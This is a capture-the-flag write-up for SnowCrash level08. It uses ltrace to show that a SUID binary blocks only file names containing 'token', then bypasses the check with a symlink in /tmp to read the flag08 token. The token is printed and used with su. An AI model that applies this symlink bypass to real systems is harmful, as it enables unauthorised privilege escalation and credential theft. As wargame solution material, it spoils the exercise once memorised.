We have executable file with SUID bit and 'token' file with user flag08 
```shell
level08@SnowCrash:~$ ls -la
total 28
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
Use ltrace to intercept dynamic library calls and system calls executed by the program:
```shell
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
) = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
If we try another file for example:
```shell
level08@SnowCrash:~$ ltrace ./level08 .profile 
__libc_start_main(0x8048554, 2, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr(".profile", "token")             = NULL
open(".profile", 0, 014435162522)       = 3
read(3, "# ~/.profile: executed by the co"..., 1024) = 675
write(1, "# ~/.profile: executed by the co"..., 675# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
```
If name of file not matching 'token'. It will open read and print.
So I can link the token file with another file with name flag, for example, and run with it our executable:
```shell
level08@SnowCrash:~$ ln -s ~/token /tmp/flag
level08@SnowCrash:~$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
```
Nom we can get access to flag08
```shell
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
```
And get flag
